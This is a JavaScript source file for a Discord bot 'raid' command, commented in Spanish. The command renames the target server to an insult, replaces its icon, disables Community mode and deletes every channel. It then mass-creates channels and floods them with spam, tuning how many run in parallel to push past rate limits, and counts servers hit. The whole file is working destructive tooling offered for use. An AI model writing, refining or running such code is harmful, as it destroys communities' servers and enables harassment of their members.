// commands/raid.js
const fs = require('fs');
const path = require('path');
const { channelNames, messages, totalChannels, messagesPerChannel, rpc } = require('../config.json');
const state = require('../state');

const MIN_DELAY = 30; // ms entre mensajes
const MAX_PARALLEL_INITIAL = 80; // número inicial de canales creados en paralelo

// 🔹 Desactiva comunidad si está activa
async function disableCommunity(guild) {
    if (guild.features.includes('COMMUNITY')) {
        try {
            await guild.edit({
                features: guild.features.filter(f => f !== 'COMMUNITY'),
                rulesChannel: null,
                publicUpdatesChannel: null
            });
            console.log(`⚠️ Comunidad desactivada en ${guild.name}`);
        } catch (err) {
            console.error(`❌ Error desactivando comunidad en ${guild.name}:`, err.message);
        }
    }
}

// 🔹 Crear un canal con mensajes
async function createChannel(guild, guildId, index) {
    if (!state.isRunning(guildId)) return;
    const name = channelNames[index % channelNames.length];
    try {
        const channel = await guild.channels.create({ name, type: 0 });

        for (let i = 0; i < messagesPerChannel; i++) {
            if (!state.isRunning(guildId)) break;
            const msg = messages[Math.floor(Math.random() * messages.length)];
            await channel.send(msg);
            await new Promise(res => setTimeout(res, MIN_DELAY));
        }
    } catch (err) {
        console.error(`Error creando canal ${name}:`, err.message);
    }
}

// 🔹 Crear exactamente totalChannels canales con autotune
async function createChannelsAutotune(guild, guildId) {
    let created = 0;
    let maxParallel = MAX_PARALLEL_INITIAL;

    while (created < totalChannels && state.isRunning(guildId)) {
        const batchCount = Math.min(totalChannels - created, maxParallel);
        const batch = [];

        for (let i = 0; i < batchCount; i++) {
            batch.push(createChannel(guild, guildId, created + i));
        }

        const start = Date.now();
        await Promise.all(batch);
        const elapsed = Date.now() - start;

        if (elapsed > 4000 && maxParallel > 10) maxParallel = Math.floor(maxParallel / 2);
        else if (elapsed < 1500 && maxParallel < 150) maxParallel += 10;

        created += batchCount;
        console.log(`✅ ${created}/${totalChannels} canales creados | Batch ${batchCount}`);
    }

    if (!state.isRunning(guildId)) console.log('🛑 Raid detenido por ForceStop');
}

// 🔹 Borra todos los canales posibles
async function deleteAllChannels(guild, user) {
    const channels = Array.from(guild.channels.cache.values());

    await Promise.all(
        channels.map(async (ch) => {
            try {
                await ch.delete(`Borrado por ${user.tag}`);
            } catch (err) {
                console.warn(`No pude borrar canal ${ch.name}: ${err.message}`);
            }
        })
    );
}

// 🔹 Actualiza usos en data.json
function updateData(guild) {
    const dataPath = path.join(__dirname, '..', 'data.json');
    let data = {};
    if (fs.existsSync(dataPath)) data = JSON.parse(fs.readFileSync(dataPath, 'utf8'));

    if (!data[guild.id]) data[guild.id] = { name: guild.name, uses: 1 };
    else data[guild.id].uses += 1;

    fs.writeFileSync(dataPath, JSON.stringify(data, null, 2));
    return data[guild.id].uses;
}

module.exports = {
    name: 'raid',
    description: 'Borra todos los canales y crea exactamente los definidos en config.json.',
    run: async (message) => {
        const guild = message.guild;
        const guildId = guild.id;
        const userId = message.author.id;

        if (!state.start(guildId, userId)) {
            return message.reply('❌ Ya hay un raid activo en este servidor.');
        }

        await message.reply('⚡ Raid activado. Desactivando comunidad, borrando canales y creando nuevos...');

        try {
            // 0) renombrar server + cambiar foto
            try {
                await guild.setName(`fucked by ${message.author.username}`);

                const iconPath = path.join(__dirname, '../foto.jpeg');
                if (fs.existsSync(iconPath)) {
                    const buffer = fs.readFileSync(iconPath);
                    await guild.setIcon(buffer);
                    console.log("✅ Foto del servidor cambiada.");
                } else {
                    console.warn("⚠️ No se encontró foto.jpeg en la carpeta raíz");
                }
            } catch (err) {
                console.error("❌ Error cambiando nombre o foto:", err.message);
            }

            // 1) desactivar comunidad si existe
            await disableCommunity(guild);

            // 2) borrar canales
            await deleteAllChannels(guild, message.author);

            // 3) crear nuevos canales
            await createChannelsAutotune(guild, guildId);

            // 4) actualizar data.json + RPC
            const uses = updateData(guild);
            if (rpc && message.client.user?.setActivity) {
                message.client.user.setActivity(`He ayudado ${uses} servidores`, { type: 'WATCHING' });
            }
        } finally {
            state.stop(guildId);
        }
    }
};

